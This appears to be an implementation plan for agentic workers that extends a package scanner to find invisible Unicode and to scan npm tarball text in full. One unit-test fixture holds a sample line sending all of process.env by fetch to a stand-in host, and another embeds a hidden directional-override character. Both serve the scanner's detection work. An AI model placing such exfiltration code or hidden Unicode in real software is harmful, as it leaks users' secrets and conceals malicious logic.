# Phase 3 Full Static Tarball And Unicode Scanning Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Detect invisible Unicode payloads and scan eligible text tarball entries beyond the existing 16 KiB sample limit.

**Architecture:** Add a focused text-risk analyzer used by tarball inspection. Preserve bounded scanning by default for very large files, but expose policy and tarball options for full-text scanning of eligible text entries.

**Tech Stack:** TypeScript, tar stream reading, Vitest.

---

## File Structure

- Create: `src/analyzers/text-content-analyzer.ts` - invisible Unicode and text pattern helpers.
- Modify: `src/analyzers/tarball-static-analyzer.ts` - consume full text when present.
- Modify: `src/registry/tarball.ts` - collect full text for eligible entries.
- Modify: `src/core/types.ts` - add `fullText?: string` to `TarballEntry` and policy option.
- Modify: `src/config/default-policy.ts` and `src/config/schema.ts` - add `fullTextTarballScanning`.
- Test: `tests/unit/tarball-static-analyzer.test.ts` - static analyzer behavior.
- Test: `tests/integration/registry-tarball-inspection.test.ts` - full text past sample boundary.
- Modify: `docs/policy.md` - document text scanning limits and Unicode controls.

### Task 1: Add Invisible Unicode Detection

- [ ] **Step 1: Write failing analyzer test**

Add to `tests/unit/tarball-static-analyzer.test.ts`:

```ts
test('flags invisible unicode in executable tarball text', () => {
  const result = analyzeTarballEntries([
    {
      path: 'package/index.js',
      size: 80,
      sample: 'const safe = true;\u202E// hidden directional control'
    }
  ]);

  expect(result.signals).toEqual([
    expect.objectContaining({
      id: 'invisible-unicode-source',
      severity: 'high',
      evidence: [
        expect.objectContaining({
          value: expect.objectContaining({
            matchedPattern: 'bidirectional control character'
          })
        })
      ]
    })
  ]);
});
```

- [ ] **Step 2: Run test to verify failure**

Run:

```sh
pnpm test tests/unit/tarball-static-analyzer.test.ts
```

Expected: fail because invisible Unicode is not detected.

- [ ] **Step 3: Add text analyzer**

Create `src/analyzers/text-content-analyzer.ts`:

```ts
export interface InvisibleUnicodeMatch {
  label: string;
  codePoint: string;
}

const invisibleUnicodePatterns: Array<[string, RegExp]> = [
  ['bidirectional control character', /[\u202A-\u202E\u2066-\u2069]/u],
  ['zero-width character', /[\u200B-\u200D\u2060\uFEFF]/u],
  ['variation selector', /[\uFE00-\uFE0F]|\uDB40[\uDD00-\uDDEF]/u]
];

export function firstInvisibleUnicodeMatch(text: string): InvisibleUnicodeMatch | undefined {
  for (const [label, pattern] of invisibleUnicodePatterns) {
    const match = pattern.exec(text);
    if (!match?.[0]) continue;
    return {
      label,
      codePoint: `U+${match[0].codePointAt(0)!.toString(16).toUpperCase().padStart(4, '0')}`
    };
  }
  return undefined;
}
```

- [ ] **Step 4: Wire tarball static analyzer**

In `src/analyzers/tarball-static-analyzer.ts`, import the helper and test `entry.fullText ?? entry.sample`:

```ts
import { firstInvisibleUnicodeMatch } from './text-content-analyzer.js';
```

Add inside `analyzeTarballEntries()` after `ext` is known:

```ts
    const content = entry.fullText ?? entry.sample;
    if (content) {
      const unicodeMatch = firstInvisibleUnicodeMatch(content);
      if (unicodeMatch && isExecutableTextExtension(ext)) {
        signals.push(
          contentSignal(
            'invisible-unicode-source',
            60,
            `Invisible Unicode control found in tarball source: ${entry.path}`,
            entry,
            'high',
            unicodeMatch.label
          )
        );
      }
    }
```

Add helper in the same file:

```ts
function isExecutableTextExtension(ext: string): boolean {
  return ['.cjs', '.cmd', '.js', '.json', '.mjs', '.ps1', '.sh', '.ts'].includes(ext);
}
```

- [ ] **Step 5: Run tests to verify pass**

Run:

```sh
pnpm test tests/unit/tarball-static-analyzer.test.ts
```

Expected: pass.

### Task 2: Add Full-Text Scanning For Eligible Files

- [ ] **Step 1: Write failing unit test**

Add:

```ts
test('uses fullText when suspicious content appears beyond sample', () => {
  const result = analyzeTarballEntries([
    {
      path: 'package/install.js',
      size: 40_000,
      sample: 'const harmless = true;',
      fullText: `${'a'.repeat(20_000)} fetch('https://example.invalid', { body: JSON.stringify(process.env) });`
    }
  ]);

  expect(result.signals.map((signal) => signal.id)).toContain('process-env-network-exfil');
});
```

- [ ] **Step 2: Run test to verify failure**

Run:

```sh
pnpm test tests/unit/tarball-static-analyzer.test.ts
```

Expected: fail because `fullText` is not used by content rules.

- [ ] **Step 3: Add type and content routing**

Modify `src/core/types.ts`:

```ts
export interface TarballEntry {
  path: string;
  size: number;
  sample?: string;
  fullText?: string;
}
```

In `src/analyzers/tarball-static-analyzer.ts`, replace checks against `entry.sample` with:

```ts
    const content = entry.fullText ?? entry.sample;
    if (!content) continue;
```

Use `content` for credential, downloader, child-process, process-env, obfuscation, wallet, and frontend runtime scans.

- [ ] **Step 4: Run unit tests**

Run:

```sh
pnpm test tests/unit/tarball-static-analyzer.test.ts tests/unit/frontend-runtime-analyzer.test.ts
```

Expected: pass.

### Task 3: Collect Full Text In Tarball Inspection

- [ ] **Step 1: Write failing integration test**

Add to `tests/integration/registry-tarball-inspection.test.ts` a synthetic tarball fixture whose malicious pattern appears after 16 KiB in `package/install.js`. Call `inspectTarballBuffer(buffer, { fullTextScanning: true })` or the final option shape selected below, then expect `process-env-network-exfil`.

```ts
expect(inspection.signals.map((signal) => signal.id)).toContain('process-env-network-exfil');
```

- [ ] **Step 2: Run integration test to verify failure**

Run:

```sh
pnpm test tests/integration/registry-tarball-inspection.test.ts
```

Expected: fail because tarball inspection only records `sample`.

- [ ] **Step 3: Add inspection options**

Modify `src/registry/tarball.ts`:

```ts
export interface TarballInspectionOptions {
  fullTextScanning?: boolean;
  maxFullTextEntryBytes?: number;
}

const DEFAULT_MAX_FULL_TEXT_ENTRY_BYTES = 1024 * 1024;
```

Update `inspectTarballBuffer`, `inspectTarballFile`, `inspectRegistryTarball`, and `inspectRegistryPackageTarball` to accept options and collect `fullText` when `fullTextScanning` is true, the entry is sampled, and size is less than or equal to `maxFullTextEntryBytes`.

- [ ] **Step 4: Wire policy option**

Add to `PolicyConfig`:

```ts
fullTextTarballScanning: boolean;
```

Add default:

```ts
fullTextTarballScanning: false,
```

In production profile defaults set:

```ts
fullTextTarballScanning: true,
```

Pass the value through `registryTarballInspection()`.

- [ ] **Step 5: Run verification**

Run:

```sh
pnpm test tests/unit/tarball-static-analyzer.test.ts tests/integration/registry-tarball-inspection.test.ts
pnpm typecheck
```

Expected: pass.

- [ ] **Step 6: Commit**

```sh
git add src/analyzers/text-content-analyzer.ts src/analyzers/tarball-static-analyzer.ts src/registry/tarball.ts src/core/types.ts src/config/default-policy.ts src/config/schema.ts tests/unit/tarball-static-analyzer.test.ts tests/integration/registry-tarball-inspection.test.ts docs/policy.md
git commit -m "feat: scan full tarball text and invisible unicode"
```
